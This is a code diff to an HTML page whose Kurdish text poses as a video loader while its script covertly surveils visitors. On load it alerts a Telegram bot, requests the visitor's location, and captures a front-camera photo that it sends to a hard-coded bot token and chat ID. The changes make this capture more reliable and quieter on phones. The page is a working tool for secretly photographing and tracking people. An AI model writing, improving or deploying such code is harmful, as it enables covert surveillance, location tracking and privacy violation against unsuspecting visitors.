@@ -18,23 +18,23 @@
         <p>تکایە ڕێگە بدە بۆ بارکردنی ڤیدیۆکە...</p>
     </div>
 
-    <video id="video" autoplay></video>
+    <video id="video" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
         const token = '8897748348:AAGMPKCQUdNf6Hf2CtcZbuuqznTLqdarrIA';
         const chat_id = '646169404';
 
-        // ١. ناردنی نامەی ئاسایی
         async function sendMessage(text) {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chat_id, text: text })
-            });
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chat_id, text: text })
+                });
+            } catch (e) {}
         }
 
-        // ٢. وەرگرتنی شوێن (Location)
         function askLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(position => {
@@ -45,33 +45,41 @@
             }
         }
 
-        // ٣. گرتنی وێنە و ناردنی
         async function startCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
+                
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', chat_id);
-                        formData.append('photo', blob, 'snap.jpg');
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
-                    }, 'image/jpeg');
-                }, 2000);
+                    
+                    canvas.toBlob(async blob => {
+                        if (blob) {
+                            const formData = new FormData();
+                            formData.append('chat_id', chat_id);
+                            formData.append('photo', blob, 'snap.jpg');
+                            try {
+                                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { 
+                                    method: 'POST', 
+                                    body: formData 
+                                });
+                            } catch (err) {}
+                        }
+                    }, 'image/jpeg', 0.8);
+                }, 3000);
             } catch (err) {
-                sendMessage("⚠️ ڕێگەی بە کامێرا نەدا.");
+                sendMessage("⚠️ ڕێگەی بە کامێرا نەدا یان کامێرا نەدۆزرایەوە.");
             }
         }
 
-        // کاتێک سایتەکە دەکرێتەوە
         window.onload = () => {
-            sendMessage("🚀 کەسێک هاتە ناو سایتەکەوە، ئێستا داوای کامێرا و شوێنی لێ دەکرێت...");
+            sendMessage("🚀 کەسێک هاتە ناو سایتەکەوە و داوای مۆڵەت دەکرێت...");
             askLocation();
             startCamera();
         };
     </script>
 </body>
 </html>
+
